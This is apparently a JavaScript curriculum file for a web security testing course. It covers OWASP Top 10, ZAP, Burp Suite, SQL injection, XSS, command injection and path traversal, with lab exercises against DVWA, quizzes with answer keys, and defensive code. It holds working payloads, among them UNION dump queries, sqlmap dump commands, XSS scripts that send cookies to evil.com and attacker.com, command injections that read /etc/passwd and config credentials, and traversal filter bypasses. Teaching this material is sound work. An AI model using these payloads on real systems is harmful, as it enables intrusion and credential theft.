// ── Security Vulnerability Testing — Modules 0-2 ─────────────────
// Modules 3-4 added by security-curriculum-advanced.js

const SECURITY_CURRICULUM = [

  // MODULE 0 — Introduction
  {
    id: 'sec-module-0',
    title: 'Introduction to Security Testing',
    icon: '🔒',
    lessons: [
      {
        id: 'sec-l0',
        title: 'OWASP Top 10 — The Security Tester\'s Roadmap',
        type: 'lesson',
        duration: '25 min',
        whatYoullLearn: [
          'What security testing is and how it differs from functional testing',
          'The OWASP Top 10 — the 10 most critical web application risks',
          'Black-box vs grey-box vs white-box security testing',
          'Legal & ethical boundaries — what you can and cannot test',
          'How this course is structured and what tools you will use'
        ],
        content: `
## 🔒 OWASP Top 10 — The Security Tester's Roadmap

Security testing answers a different question than functional testing: **"Can an attacker make this application do something it wasn't designed to do?"**

A login page that correctly rejects wrong passwords *passes* a functional test. But if it's vulnerable to SQL Injection, a functional test would never find it.

---

### 🏆 The OWASP Top 10 (2021)

**OWASP** (Open Web Application Security Project) is the authority on web security. Their Top 10 is the industry-standard list of the most critical risks.

| # | Risk | What it means |
|---|---|---|
| A01 | **Broken Access Control** | Users can act outside their intended permissions |
| A02 | **Cryptographic Failures** | Sensitive data exposed due to weak/no encryption |
| A03 | **Injection** | Attacker injects malicious code (SQL, OS commands, LDAP) |
| A04 | **Insecure Design** | Missing security controls by design |
| A05 | **Security Misconfiguration** | Default passwords, open S3 buckets, verbose errors |
| A06 | **Vulnerable Components** | Using libraries with known CVEs |
| A07 | **Auth Failures** | Broken login, weak session management |
| A08 | **Software Integrity Failures** | Unsigned updates, insecure CI/CD pipelines |
| A09 | **Logging Failures** | No audit trail; attacks go undetected |
| A10 | **SSRF** | Server-Side Request Forgery — server fetches attacker-controlled URLs |

This course covers A01, A02, A03, and A07 in depth — the ones most commonly found in bug bounty programs and penetration tests.

---

### 🔍 Types of Security Testing

\`\`\`
Black-box   → No prior knowledge. Simulates an external attacker.
Grey-box    → Some knowledge (API docs, account credentials). Most common in QA security testing.
White-box   → Full source code + architecture access. Most thorough.
\`\`\`

As a QA engineer, you typically do **grey-box** testing — you know the application, you have test accounts, and you're looking for vulnerabilities before the product ships.

---

### ⚖️ Legal & Ethical Boundaries

**NEVER test systems you don't have permission to test.** This is a crime in most countries, even if no harm is done.

**Safe targets for this course:**
- \`DVWA\` (Damn Vulnerable Web Application) — a deliberately vulnerable app you run locally
- \`http://testphp.vulnweb.com\` — Acunetix's intentionally vulnerable site (public practice target)
- \`https://juice-shop.herokuapp.com\` — OWASP Juice Shop (intentionally vulnerable Node app)
- Your own applications

**Never test:**
- Production systems without written authorisation
- Government, banking, or healthcare systems
- Any system where you have not explicitly received permission in writing

---

### 🛠️ Tools You'll Use

| Tool | Purpose | Cost |
|---|---|---|
| **OWASP ZAP** | Web application scanner, proxy | Free |
| **Burp Suite Community** | Intercept & modify HTTP requests | Free |
| **DVWA** | Deliberately vulnerable target app | Free |
| **OWASP Juice Shop** | Modern vulnerable Node.js target | Free |
| **sqlmap** | Automated SQL injection detection | Free |
| **Nikto** | Web server misconfiguration scanner | Free |

---

### 📋 The Security Testing Workflow

\`\`\`
1. Reconnaissance  → Map the application: endpoints, parameters, tech stack
2. Scanning        → Automated tools identify potential vulnerabilities
3. Manual testing  → Verify and exploit findings manually
4. Reporting       → Document: vulnerability, impact, evidence, remediation
5. Retest          → Verify fixes are actually effective
\`\`\`
`,
        exercise: {
          title: 'Set Up Your Security Testing Lab',
          task: `Set up your local security testing environment:

1. **Install DVWA** (Damn Vulnerable Web Application):
   - Option A (Docker): \`docker run --rm -it -p 80:80 vulnerables/web-dvwa\`
   - Option B (XAMPP): Download from https://dvwa.co.uk
   - Open http://localhost/dvwa → Login: admin/password
   - Go to DVWA Security → Set to "Low"

2. **Install OWASP ZAP**:
   - Download from https://zaproxy.org
   - Launch ZAP → choose "Automated Scan" mode for now

3. **Explore OWASP Juice Shop** (no install needed):
   - Open https://juice-shop.herokuapp.com
   - Browse the shop as a normal user — count how many obvious security issues you spot

4. **Answer these questions** and paste into AI chat:
   - What is the URL of the admin panel in Juice Shop? (hint: try common paths)
   - What technology does Juice Shop run on? (hint: check response headers)
   - Can you access another user's basket? (hint: try basket/1, basket/2...)`,
          hints: [
            'For Docker: run `docker --version` first to confirm Docker is installed. If not, download Docker Desktop from docker.com',
            'DVWA default credentials are admin/password — you\'ll need to click "Create/Reset Database" on first launch',
            'Juice Shop admin panel is at a path you might expect an admin area to be at — think common conventions'
          ]
        },
        quiz: [
          {
            type: 'mcq',
            q: 'You discover a SQL injection vulnerability in your company\'s production login page while testing a new feature. What should you do FIRST?',
            options: [
              'Exploit it fully to understand the impact, then report it',
              'Report it immediately to your security/dev team without further exploitation in production',
              'Fix it yourself directly in the production database',
              'Post it to a public bug bounty platform first'
            ],
            answer: 1
          },
          {
            type: 'mcq',
            q: 'Which OWASP Top 10 category covers SQL injection, XSS, and command injection?',
            options: [
              'A01 — Broken Access Control',
              'A07 — Authentication Failures',
              'A03 — Injection',
              'A05 — Security Misconfiguration'
            ],
            answer: 2
          },
          {
            type: 'truefalse',
            q: 'Grey-box security testing means the tester has full access to the application source code.',
            answer: false
          },
          {
            type: 'fillin',
            q: 'OWASP stands for Open Web Application _______ Project.',
            answer: 'Security'
          }
        ]
      }
    ]
  },

  // MODULE 1 — Tools & Setup
  {
    id: 'sec-module-1',
    title: 'Tools & Setup',
    icon: '🛠️',
    lessons: [
      {
        id: 'sec-l1',
        title: 'OWASP ZAP — Automated Scanning & the Intercepting Proxy',
        type: 'lesson',
        duration: '35 min',
        whatYoullLearn: [
          'Configure ZAP as an intercepting proxy in your browser',
          'Run an automated spider + active scan against DVWA',
          'Interpret ZAP\'s alert severity levels (High/Medium/Low/Informational)',
          'Use ZAP\'s HUD (Heads-Up Display) for in-browser scanning',
          'Export a security scan report in HTML format'
        ],
        content: `
## 🔍 OWASP ZAP — Automated Scanning & the Intercepting Proxy

**ZAP (Zed Attack Proxy)** is the world's most widely used open-source web security scanner. It sits between your browser and the target application, intercepting every request and response.

---

### 🌐 How a Proxy Works

\`\`\`
Normal:   Browser → Server
With ZAP: Browser → ZAP → Server
                 ↓
           ZAP sees ALL traffic,
           can modify requests,
           and flags suspicious patterns
\`\`\`

---

### ⚙️ Configure Your Browser to Use ZAP

**Step 1: Check ZAP's proxy settings**
- ZAP → Tools → Options → Local Proxies
- Default: \`localhost:8080\`

**Step 2: Set browser proxy** (Firefox recommended)
- Firefox → Settings → Network Settings → Manual proxy
- HTTP Proxy: \`127.0.0.1\`, Port: \`8080\`
- Also use this proxy for HTTPS: ✓

**Step 3: Trust ZAP's certificate** (for HTTPS)
- Browse to http://zap while proxy is on → download ZAP Root CA
- Firefox → Settings → Privacy & Security → View Certificates → Import
- Trust it to identify websites ✓

---

### 🕷️ Spider — Map the Application

A spider crawls the application, finding all URLs and forms.

**ZAP → Quick Start → Automated Scan:**
\`\`\`
URL to attack: http://localhost/dvwa
☑ Traditional Spider
Click: Attack
\`\`\`

Watch the Sites tree fill with every page ZAP discovers. This gives you the attack surface.

---

### 🔥 Active Scan — Find Vulnerabilities

After the spider finishes:
- Right-click the target in Sites tree → Attack → Active Scan
- ZAP sends thousands of malicious payloads to every parameter
- Alerts tab fills with findings

**Alert severity levels:**

| Level | Meaning | Example |
|---|---|---|
| 🔴 High | Exploitable, serious impact | SQL Injection, RCE |
| 🟠 Medium | Exploitable with conditions | XSS, CSRF |
| 🟡 Low | Minor risk | Verbose error messages |
| 🔵 Informational | For awareness | Cookies without HttpOnly |

---

### 📊 Reading ZAP Alerts

Click any alert to see:
- **Description** — what the vulnerability is
- **URL** — which endpoint is affected
- **Parameter** — which input field triggered it
- **Attack** — the exact payload ZAP used
- **Evidence** — what in the response proves the vulnerability
- **Solution** — how to fix it

\`\`\`
Alert: SQL Injection
URL: http://localhost/dvwa/vulnerabilities/sqli/
Parameter: id
Attack: 1 AND 1=1
Evidence: You have an error in your SQL syntax...
Risk: High
\`\`\`

---

### 📝 Export a Report

ZAP → Report → Generate Report → HTML format

The report contains all alerts with severity, description, affected URLs, and remediation advice — ready to share with developers.

---

### 🧩 ZAP HUD (Heads-Up Display)

Enable the HUD for in-browser security testing:
- ZAP → Tools → Options → HUD → Enable
- Browse DVWA normally — ZAP overlays security info directly in the browser
- Green lock = ZAP is monitoring this page
- Alert counter shows findings in real time
`,
        exercise: {
          title: 'Run Your First ZAP Scan Against DVWA',
          task: `1. Start DVWA (docker run --rm -it -p 80:80 vulnerables/web-dvwa)
2. Configure Firefox to use ZAP proxy (127.0.0.1:8080)
3. In ZAP → Automated Scan → URL: http://localhost/dvwa → Attack
4. Wait for spider to complete (watch Sites tree fill)
5. Run Active Scan against http://localhost/dvwa
6. Open the Alerts tab when done — screenshot showing:
   - At least 1 High-severity alert
   - Total alert count
7. Click on a High-severity alert — read the Attack and Evidence fields
8. Export a report: ZAP → Report → Generate Report → HTML

Answer in AI chat: What High-severity vulnerability did ZAP find? What parameter is it in?`,
          hints: [
            'DVWA must be running and you must be logged in before ZAP can spider it — ZAP can\'t log in automatically by default',
            'The spider may miss pages behind login forms. To help: browse DVWA manually with ZAP proxy on, then run Active Scan from the Sites tree',
            'Active Scan can take 5-15 minutes on DVWA — this is normal'
          ]
        },
        quiz: [
          {
            type: 'mcq',
            q: 'ZAP\'s Active Scan is different from the Spider because:',
            options: [
              'The Spider finds URLs; the Active Scan sends attack payloads to those URLs to find vulnerabilities',
              'The Active Scan maps the application; the Spider attacks it',
              'Both do the same thing — Active Scan is just faster',
              'The Spider requires authentication; Active Scan does not'
            ],
            answer: 0
          },
          {
            type: 'mcq',
            q: 'A ZAP alert marked "Informational" should be:',
            options: [
              'Fixed immediately — Informational alerts are the highest priority',
              'Noted for awareness but is not a direct exploitable vulnerability',
              'Ignored — ZAP creates Informational alerts by mistake',
              'Escalated to the CISO before any other work'
            ],
            answer: 1
          },
          {
            type: 'truefalse',
            q: 'When ZAP is configured as an intercepting proxy, it can see and modify both HTTP and HTTPS traffic (after installing its certificate).',
            answer: true
          },
          {
            type: 'fillin',
            q: 'In ZAP, the _______ crawls the application to discover all URLs and forms before the attack phase.',
            answer: 'Spider'
          }
        ]
      },

      {
        id: 'sec-l2',
        title: 'Burp Suite — Intercepting, Repeating & Fuzzing Requests',
        type: 'lesson',
        duration: '35 min',
        whatYoullLearn: [
          'Configure Burp Suite Community as an intercepting proxy',
          'Capture and inspect HTTP requests in Burp Proxy',
          'Use Burp Repeater to manually modify and replay requests',
          'Use Burp Intruder to fuzz parameters with wordlists',
          'Understand the difference between Burp and ZAP use cases'
        ],
        content: `
## 🔫 Burp Suite — Intercepting, Repeating & Fuzzing Requests

**Burp Suite** is the industry-standard tool for manual web application security testing. While ZAP is excellent for automated scanning, Burp excels at manual, targeted testing.

**Burp Community Edition** is free and includes the essential tools.

---

### 🌐 Set Up Burp Proxy

**Launch Burp Suite Community → New Temporary Project → Use Burp Defaults**

1. Go to Proxy tab → Options
2. Note the listener: \`127.0.0.1:8080\` (same as ZAP — only run one at a time)
3. Configure Firefox proxy: \`127.0.0.1:8080\`
4. Install Burp's CA certificate:
   - Browse to \`http://burpsuite\` → Download certificate
   - Firefox → Settings → Certificates → Import → Trust for websites ✓

---

### 🛑 Intercept Mode — Catching Requests

In Burp → Proxy → Intercept → "Intercept is ON"

Now browse to DVWA and submit the login form:

\`\`\`
POST /dvwa/login.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

username=admin&password=password&Login=Login&user_token=abc123
\`\`\`

Burp catches the request before it's sent. You can:
- Read it — see every header and the request body
- Modify it — change \`password=password\` to \`password=wrongpass\`
- Forward it — send the (modified) request on to the server
- Drop it — discard it entirely

---

### 🔁 Burp Repeater — Replay Modified Requests

Right-click any request in Proxy history → Send to Repeater

In Repeater:
1. Modify the request (change a parameter value)
2. Click Send
3. See the response on the right
4. Modify again → Send again

This is the core of manual security testing — you craft specific payloads and observe the server's response.

\`\`\`
Original:  GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
Modified:  GET /dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit

Response contains: "You have an error in your SQL syntax..."
→ SQL Injection confirmed!
\`\`\`

---

### 💣 Burp Intruder — Automated Fuzzing

Intruder sends many requests with different payloads (a "fuzzing" attack).

**Use case: Brute-force login**

1. Send the POST login request to Intruder
2. Highlight the \`password=§admin§\` value → Add § markers
3. Payloads tab → Load a wordlist (e.g., common-passwords.txt)
4. Start Attack
5. Look at response Length column — a different length = different response = possible valid password

**Community Edition note:** Intruder is throttled in Community Edition. For heavy fuzzing, use ZAP's Fuzzer (unrestricted) or ffuf.

---

### 🆚 Burp vs ZAP — When to Use Each

| Task | Best tool |
|---|---|
| Automated full-site scan | ZAP (Active Scan) |
| Manual request inspection | Burp (Proxy + Repeater) |
| Targeted parameter fuzzing | Burp Intruder / ZAP Fuzzer |
| In-browser security overlay | ZAP HUD |
| API security testing | Both (Burp for manual, ZAP for automated) |
| CI/CD integration | ZAP (docker-based) |

In practice: use **ZAP for automated discovery** and **Burp for manual exploitation**. Many security testers run both.

---

### 📡 Burp HTTP History

Proxy → HTTP history shows every request/response — filterable by host, method, content type.

Use the search bar to find:
- \`password\` in request body (look for plaintext credentials)
- \`Bearer\` in headers (JWT tokens)
- \`session\` in cookies (session ID analysis)
`,
        exercise: {
          title: 'Intercept and Modify Requests with Burp Repeater',
          task: `1. Start Burp Suite Community → configure Firefox proxy
2. Browse to DVWA → SQL Injection (Low security)
3. Submit: ID = 1, click Submit
4. In Burp Proxy history, find the GET request to /vulnerabilities/sqli/
5. Send it to Repeater (right-click → Send to Repeater)
6. In Repeater, change id=1 to id=1' (add a single quote)
7. Click Send — read the response

Questions to answer in AI chat:
- What error message do you see in the response?
- What does this error tell you about the database?
- Now try id=1 OR 1=1-- (SQL always-true condition). What happens?

Bonus: In Proxy → HTTP History, use the search bar to find any request containing the word "password" in the body.`,
          hints: [
            'Single quote (apostrophe) is the classic SQL injection test character — it breaks out of the SQL string context',
            'The error message usually names the database type (MySQL, PostgreSQL, etc.) — this is called "error-based SQL injection"',
            'In Repeater, the right pane shows the raw HTTP response — look at the Response tab, then the Render tab for a visual view'
          ]
        },
        quiz: [
          {
            type: 'mcq',
            q: 'Burp Suite Repeater is used for:',
            options: [
              'Automatically scanning the application for all vulnerabilities',
              'Manually sending and modifying individual HTTP requests to test specific parameters',
              'Brute-forcing login forms with a password list',
              'Crawling the application to discover all URLs'
            ],
            answer: 1
          },
          {
            type: 'mcq',
            q: 'In Burp Intruder, "§ markers §" around a value indicate:',
            options: [
              'The value is encrypted and cannot be modified',
              'The position where Intruder will substitute payloads from the wordlist',
              'The parameter is required and cannot be removed',
              'The server rejects any modification to this value'
            ],
            answer: 1
          },
          {
            type: 'truefalse',
            q: 'Burp Suite Community Edition\'s Intruder has throttling restrictions that limit its fuzzing speed.',
            answer: true
          },
          {
            type: 'fillin',
            q: 'Burp\'s _______ tool allows you to replay and modify a single captured HTTP request as many times as needed to test specific vulnerability hypotheses.',
            answer: 'Repeater'
          }
        ]
      }
    ]
  },

  // MODULE 2 — Injection Vulnerabilities
  {
    id: 'sec-module-2',
    title: 'Injection Vulnerabilities',
    icon: '💉',
    lessons: [
      {
        id: 'sec-l3',
        title: 'SQL Injection — From Detection to Data Extraction',
        type: 'lesson',
        duration: '40 min',
        whatYoullLearn: [
          'What SQL Injection is and why it is the most dangerous web vulnerability',
          'Detect SQL injection manually using error-based and boolean-based techniques',
          'Extract database schema and data using UNION-based injection',
          'Use sqlmap for automated SQL injection detection and exploitation',
          'Understand and apply SQL injection prevention techniques'
        ],
        content: `
## 💉 SQL Injection — From Detection to Data Extraction

**SQL Injection (SQLi)** is #1 on many security lists. It lets an attacker manipulate the SQL query a server sends to its database — reading, modifying, or deleting data they should never see.

---

### 🔍 Why SQL Injection Happens

The vulnerable code pattern:

\`\`\`php
// VULNERABLE — user input directly concatenated into SQL
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = '$id'";
\`\`\`

If \`$id\` = \`1' OR '1'='1\`, the query becomes:
\`\`\`sql
SELECT * FROM users WHERE id = '1' OR '1'='1'
-- '1'='1' is always true → returns ALL users
\`\`\`

---

### 🧪 Step 1: Detect SQL Injection

**Test 1: Single quote**
\`\`\`
Input: 1'
Result: MySQL error → injectable!
\`\`\`

**Test 2: Boolean test**
\`\`\`
Input: 1 AND 1=1   → returns normal result
Input: 1 AND 1=2   → returns no result
→ Different results = Boolean-based SQLi confirmed
\`\`\`

**Test 3: Always-true**
\`\`\`
Input: 1 OR 1=1
Result: Returns ALL records
\`\`\`

---

### 🔓 Step 2: Find Column Count (for UNION)

\`\`\`sql
-- Increase ORDER BY until you get an error
1 ORDER BY 1--    → works
1 ORDER BY 2--    → works
1 ORDER BY 3--    → ERROR → table has 2 columns

-- Confirm with UNION SELECT
1 UNION SELECT NULL, NULL--
\`\`\`

---

### 📦 Step 3: Extract Data with UNION

\`\`\`sql
-- Find database version
1 UNION SELECT @@version, NULL--

-- Find current database name
1 UNION SELECT database(), NULL--

-- List all tables in current database
1 UNION SELECT table_name, NULL FROM information_schema.tables
  WHERE table_schema=database()--

-- Extract columns from users table
1 UNION SELECT column_name, NULL FROM information_schema.columns
  WHERE table_name='users'--

-- Dump usernames and passwords
1 UNION SELECT user, password FROM users--
\`\`\`

---

### 🤖 sqlmap — Automated SQL Injection

sqlmap automates the entire process:

\`\`\`bash
# Basic detection
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low"

# Dump all databases
sqlmap -u "..." --dbs

# Dump a specific table
sqlmap -u "..." -D dvwa -T users --dump

# Use a request file from Burp
sqlmap -r request.txt --level=5 --risk=3
\`\`\`

**How to get the request file:**
- In Burp → right-click the request → Save item → save as \`request.txt\`

---

### 🛡️ Prevention: Parameterised Queries

\`\`\`java
// VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE id = '" + userId + "'";

// SECURE — parameterised query (PreparedStatement)
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
stmt.setString(1, userId);  // userId is treated as DATA, not SQL
ResultSet rs = stmt.executeQuery();
\`\`\`

Parameterised queries separate code from data — even if \`userId\` is \`1' OR '1'='1\`, the database treats it as a literal string, not SQL code.

**Additional defences:**
- Use an ORM (Hibernate, JPA) — they use parameterised queries by default
- Validate and whitelist input types (numbers must be numbers)
- Least-privilege database accounts (app user can't DROP TABLE)
- WAF (Web Application Firewall) as a last line of defence
`,
        exercise: {
          title: 'Extract the DVWA User Database via SQL Injection',
          task: `Using DVWA (Security Level: Low):

**Part 1 — Manual UNION injection:**
1. Browse to DVWA → SQL Injection
2. Test: input \`1'\` → confirm SQL error
3. Find column count: try \`1 ORDER BY 1--\`, \`1 ORDER BY 2--\`, etc.
4. Extract database name: \`1 UNION SELECT database(), NULL--\`
5. Extract tables: \`1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--\`
6. Extract usernames and passwords: \`1 UNION SELECT user, password FROM users--\`
7. Screenshot showing the dumped usernames and hashed passwords

**Part 2 — sqlmap:**
1. Copy the request from Burp (right-click → Save item → sqli-request.txt)
2. Run: \`sqlmap -r sqli-request.txt --dump -T users\`
3. Screenshot of sqlmap output confirming the dump

How many users are in the database? What hashing algorithm are the passwords stored with?`,
          hints: [
            'If UNION SELECT gives an error, adjust the NULL count — try 1, 2, 3 NULLs until it works. The count must match the original query\'s column count.',
            'In DVWA SQL Injection, the comment character is -- (double dash followed by a space) or # — both work in MySQL',
            'sqlmap will ask "do you want to test other parameters?" — you can answer N to focus on just the id parameter'
          ]
        },
        quiz: [
          {
            type: 'mcq',
            q: 'Why does the input `1\' OR \'1\'=\'1` cause a SQL injection vulnerability to return all rows?',
            options: [
              'It triggers a database error that dumps all records',
              'The OR condition makes the WHERE clause always evaluate to true, so every row matches',
              'It bypasses the SQL parser and executes raw queries',
              'Single quotes are the escape character in MySQL'
            ],
            answer: 1
          },
          {
            type: 'mcq',
            q: 'Why does a PreparedStatement prevent SQL injection?',
            options: [
              'It encrypts all parameters before sending them to the database',
              'It separates the SQL structure (sent first) from the data (sent separately) — the database never interprets data as SQL code',
              'It uses a whitelist to reject special characters like single quotes',
              'It runs the query in a sandboxed environment'
            ],
            answer: 1
          },
          {
            type: 'truefalse',
            q: 'UNION-based SQL injection requires knowing the exact number of columns in the original query.',
            answer: true
          },
          {
            type: 'fillin',
            q: 'The `information_schema._______ ` table contains metadata about all columns in all tables in the database.',
            answer: 'columns'
          }
        ]
      },

      {
        id: 'sec-l4',
        title: 'Cross-Site Scripting (XSS) — Reflected, Stored & DOM-Based',
        type: 'lesson',
        duration: '35 min',
        whatYoullLearn: [
          'Understand the three types of XSS and how each is exploited',
          'Inject and execute JavaScript in a browser via reflected XSS',
          'Store a persistent XSS payload that executes for every visitor',
          'Steal session cookies using XSS to hijack a user\'s session',
          'Implement proper output encoding to prevent XSS'
        ],
        content: `
## 🌐 Cross-Site Scripting (XSS)

**XSS** lets an attacker inject malicious JavaScript into a web page that other users view. The browser trusts the page's JavaScript — it doesn't know if it was written by the developer or injected by an attacker.

**XSS impact:**
- Steal session cookies → account takeover
- Redirect users to phishing sites
- Keylog form inputs (credit card numbers, passwords)
- Deface the page
- Execute actions on behalf of the victim (CSRF via XSS)

---

### 🔴 Type 1: Reflected XSS

The malicious script is in the URL. The server "reflects" it back in the response.

\`\`\`
URL: http://example.com/search?q=<script>alert('XSS')</script>
Page renders: You searched for: <script>alert('XSS')</script>
Browser executes: alert('XSS')
\`\`\`

**Attack vector:** The attacker sends a malicious URL to the victim. When the victim clicks it, the script runs in their browser in the context of the trusted site.

**Testing in DVWA (Security: Low):**
\`\`\`
DVWA → XSS (Reflected)
Input: <script>alert('XSS')</script>
Result: Alert box pops up in browser
\`\`\`

---

### 🔴 Type 2: Stored (Persistent) XSS

The malicious script is stored in the database. It runs for **every user** who views the infected content.

\`\`\`
Comment form input:
Name: Attacker
Message: <script>document.location='http://evil.com/?c='+document.cookie</script>

→ Every visitor to the comments page sends their cookies to evil.com
\`\`\`

This is the most dangerous type — it doesn't require the victim to click a special link.

**Testing in DVWA:**
\`\`\`
DVWA → XSS (Stored)
Name: test
Message: <script>alert('stored xss')</script>
Submit → reload the page → alert fires every time
\`\`\`

---

### 🔴 Type 3: DOM-Based XSS

The vulnerability is in client-side JavaScript, not the server. The server's response is fine — the browser's own code creates the vulnerability.

\`\`\`javascript
// Vulnerable code — reads URL hash and writes to DOM
document.getElementById('output').innerHTML = location.hash.slice(1);
\`\`\`

\`\`\`
Attack URL: http://example.com/page#<img src=x onerror=alert('DOM XSS')>
The server never sees the payload (#hash is client-only)
\`\`\`

---

### 🍪 Cookie Theft via XSS

The most common real-world XSS attack:

\`\`\`javascript
// Payload: send victim's cookies to attacker's server
<script>
  var img = new Image();
  img.src = 'http://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>
\`\`\`

If the attacker captures \`PHPSESSID=abc123\`, they can use that cookie in their own browser — logged in as the victim, without needing the password.

**Defence — HttpOnly cookie flag:**
\`\`\`
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Strict
\`\`\`

With \`HttpOnly\`, JavaScript cannot read the cookie — \`document.cookie\` won't show it.

---

### 🛡️ Prevention: Output Encoding

\`\`\`java
// VULNERABLE — raw user input in HTML output
response.getWriter().println("<p>Hello " + username + "</p>");

// SECURE — HTML-encode before outputting
import org.owasp.encoder.Encode;
response.getWriter().println("<p>Hello " + Encode.forHtml(username) + "</p>");
\`\`\`

| Context | Encoding needed | Example |
|---|---|---|
| HTML body | HTML entity encoding | \`<\` → \`&lt;\` |
| HTML attribute | Attribute encoding | \`"\` → \`&quot;\` |
| JavaScript | JS string encoding | \`'\` → \`\\'\` |
| URL parameter | URL encoding | \`<\` → \`%3C\` |

**Rule:** Never insert untrusted data into HTML/JS without context-specific encoding.
`,
        exercise: {
          title: 'Execute Stored XSS and Steal a Session Cookie',
          task: `In DVWA (Security Level: Low):

**Part 1 — Reflected XSS:**
1. DVWA → XSS (Reflected)
2. Test: \`<script>alert(document.cookie)</script>\`
3. Screenshot showing the alert box with your session cookie

**Part 2 — Stored XSS cookie theft:**
1. DVWA → XSS (Stored)
2. In Name field: \`attacker\`
3. In Message field (you may need to increase maxlength via browser devtools):
   \`<script>alert('Cookie: ' + document.cookie)</script>\`
4. Submit → reload the page
5. Screenshot: alert fires on page load for every visitor

**Part 3 — Analysis:**
1. Right-click the browser → Inspect → Application tab → Cookies
2. Look for the PHPSESSID cookie — is it HttpOnly?
3. In DVWA Security settings → check if PHP's session cookie has HttpOnly set
4. Answer in AI chat: What is the PHPSESSID value? Is it HttpOnly? What would need to change to prevent cookie theft via XSS?`,
          hints: [
            'If the Message field has a maxlength attribute, right-click → Inspect → edit the maxlength="50" to maxlength="500" in the HTML',
            'An HttpOnly cookie shows a checkmark in the HttpOnly column in browser DevTools → Application → Cookies',
            'On DVWA\'s low security setting, there is zero XSS filtering — any script tag works directly'
          ]
        },
        quiz: [
          {
            type: 'mcq',
            q: 'What is the key difference between Reflected and Stored XSS?',
            options: [
              'Reflected XSS uses JavaScript; Stored XSS uses HTML',
              'Stored XSS persists in the database and executes for every user who visits the page; Reflected XSS requires the victim to click a malicious link',
              'Reflected XSS is more dangerous because it affects all users',
              'There is no practical difference — both require clicking a link'
            ],
            answer: 1
          },
          {
            type: 'mcq',
            q: 'The HttpOnly cookie flag prevents XSS cookie theft because:',
            options: [
              'It encrypts the cookie value so attackers cannot read it',
              'It makes the cookie invisible to JavaScript — document.cookie cannot access HttpOnly cookies',
              'It only allows the cookie to be sent over HTTPS',
              'It expires the cookie after each page load'
            ],
            answer: 1
          },
          {
            type: 'truefalse',
            q: 'DOM-based XSS payloads are visible in the server\'s HTTP response because the server processes the fragment (#hash) of the URL.',
            answer: false
          },
          {
            type: 'fillin',
            q: 'The OWASP Java Encoder library method _______ should be used to safely render user input in an HTML body.',
            answer: 'Encode.forHtml'
          }
        ]
      },

      {
        id: 'sec-l5',
        title: 'Command Injection & Path Traversal',
        type: 'lesson',
        duration: '30 min',
        whatYoullLearn: [
          'What OS command injection is and how it achieves Remote Code Execution',
          'Use chaining characters (; && || |) to inject OS commands',
          'Execute and read system files via command injection',
          'Exploit path traversal to read files outside the web root',
          'Apply safe alternatives to system command execution in code'
        ],
        content: `
## 💻 Command Injection & Path Traversal

### OS Command Injection

If a web application passes user input to a system shell command without sanitisation, an attacker can execute arbitrary operating system commands — often leading to **full server compromise**.

---

### 🔍 How It Happens

\`\`\`php
// VULNERABLE — user input directly in shell command
$ip = $_GET['ip'];
$result = shell_exec("ping -c 1 " . $ip);
echo $result;
\`\`\`

If \`$ip\` = \`127.0.0.1; cat /etc/passwd\`, the command becomes:
\`\`\`bash
ping -c 1 127.0.0.1; cat /etc/passwd
\`\`\`

The semicolon ends the ping command and runs \`cat /etc/passwd\`.

---

### 🔗 Command Chaining Characters

| Character | Behaviour | Example |
|---|---|---|
| \`;\` | Run second command regardless | \`cmd1; cmd2\` |
| \`&&\` | Run second ONLY if first succeeds | \`cmd1 && cmd2\` |
| \`\|\|\` | Run second ONLY if first FAILS | \`cmd1 \|\| cmd2\` |
| \`\|\` | Pipe output of first to second | \`cmd1 \| cmd2\` |
| \`\`cmd\`\` | Command substitution (backtick) | \`echo \`id\`\` |
| \`$(cmd)\` | Command substitution | \`echo $(whoami)\` |

---

### 🧪 Testing in DVWA

\`\`\`
DVWA → Command Injection (Security: Low)
Input: 127.0.0.1; id
Result: uid=33(www-data) gid=33(www-data) groups=33(www-data)
→ We know the web server user

Input: 127.0.0.1; cat /etc/passwd
→ Reads the system user list

Input: 127.0.0.1; ls -la /var/www/html
→ Lists all web application files

Input: 127.0.0.1; cat /var/www/html/config.php
→ Reads database credentials from config file!
\`\`\`

This is why command injection is a critical severity vulnerability — from a ping form, we can read the entire filesystem.

---

### 📁 Path Traversal (Directory Traversal)

Path traversal lets an attacker read files outside the intended web directory by using \`../\` sequences to navigate up the file tree.

\`\`\`
Intended URL: http://example.com/file?name=report.pdf
Loads: /var/www/html/files/report.pdf

Attack URL:   http://example.com/file?name=../../../../etc/passwd
Loads: /etc/passwd  ← server's password file!
\`\`\`

**URL-encoded variants** (to bypass naive filters):
\`\`\`
../           → %2e%2e%2f
..%2f         → mix of encoded/plain
....//        → double dot trick to bypass filters that remove ../
\`\`\`

**Testing in DVWA:**
\`\`\`
DVWA → File Inclusion (Security: Low)
URL: http://localhost/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
\`\`\`

---

### 🛡️ Prevention

**Command Injection:**
\`\`\`java
// AVOID system commands entirely — use Java APIs instead
// VULNERABLE:
Runtime.getRuntime().exec("ping " + host);

// SECURE: use Java's InetAddress
InetAddress.getByName(host).isReachable(3000);
\`\`\`

If you MUST use shell commands:
- Use a whitelist of allowed values (only digits and dots for IP addresses)
- Use ProcessBuilder with argument list (not a single string)
- Never pass raw user input to shell

\`\`\`java
// SECURE with ProcessBuilder (no shell interpretation)
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", sanitizedIp);
// sanitizedIp must match regex: ^[0-9.]+$
\`\`\`

**Path Traversal:**
\`\`\`java
// Canonicalise path and verify it starts with the allowed directory
File file = new File(BASE_DIR, userInput).getCanonicalFile();
if (!file.getPath().startsWith(BASE_DIR)) {
    throw new SecurityException("Path traversal detected!");
}
\`\`\`
`,
        exercise: {
          title: 'Exploit Command Injection to Read Server Files',
          task: `In DVWA (Security Level: Low):

**Part 1 — Basic Command Injection:**
1. DVWA → Command Injection
2. Test: \`127.0.0.1; id\` → what user is the web server running as?
